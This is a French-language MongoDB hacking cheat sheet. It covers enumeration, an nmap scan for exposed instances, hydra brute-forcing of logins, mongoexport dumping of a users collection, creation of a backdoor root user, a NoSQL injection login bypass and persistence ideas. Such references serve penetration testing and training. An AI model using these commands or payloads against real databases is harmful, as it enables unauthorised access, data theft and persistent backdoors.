# 🍃 MongoDB - Cheatsheet Cybersécurité

Ce fichier couvre les bases, les commandes essentielles, et les techniques d’exploitation & d'infiltration d’une base MongoDB.

---

## 🧾 1. Informations générales

mongo  
> Lance le shell MongoDB localement (si installé)

mongo --host IP --port PORT  
> Se connecte à une instance MongoDB distante

mongo mongodb://user:pass@host:port/db  
> Connexion avec authentification (utile pour tester des credentials par défaut)

---

## 🔍 2. Enumération

show dbs  
> Affiche toutes les bases disponibles

use <db>  
> Change de base

show collections  
> Affiche les tables (collections)

db.<collection>.find().pretty()  
> Affiche les documents d’une collection de manière lisible

db.getUsers()  
> Liste des utilisateurs (si les droits le permettent)

db.runCommand({ connectionStatus: 1 })  
> Infos sur la session et l'utilisateur

db.version()  
> Version de MongoDB (utile pour l’exploitation)

---

## 🔐 3. Authentification faible ou absente

Si aucun mot de passe n’est requis et Mongo est exposé sur Internet :  
> Peut être directement exploité

nmap -p 27017 --script mongodb-info <IP>  
> Détecte l’instance Mongo exposée

mongo-express  
> Interface web de Mongo (si installée) souvent oubliée par les devs, accessible sans auth

---

## 🧰 4. Outils d’exploitation

### 🧪 Test de login

hydra -s 27017 -V -L users.txt -P pass.txt mongodb://IP  
> Bruteforce d’identifiants MongoDB

crackmapmongo  
> Comme crackmapexec mais pour MongoDB (projets GitHub)

---

## 🐚 5. Exfiltration de données

db.<collection>.find()  
> Accès aux données stockées

mongoexport --host IP -d db -c users -o dump.json  
> Export d’une collection au format JSON

---

## 📈 6. Escalade / Abus de privilèges

### 🛠 Ajout d’un utilisateur admin (si droits admin)

db.createUser({user: "hacker", pwd: "P@ssw0rd", roles:[{role: "root", db: "admin"}]})  
> Création d’un super-utilisateur

### 📦 Injection NoSQL (web)

POST login:

username[$ne]=1&password[$ne]=1
> Contourne une vérification basique

## 🚪 7. Persistences / portes dérobées
Création d'utilisateurs persistants avec rôle admin

Ajout de scripts malicieux dans les collections

##  8. Ressources

PayloadsAllTheThings - MongoDB
MongoDB NoSQL Injection Cheatsheet
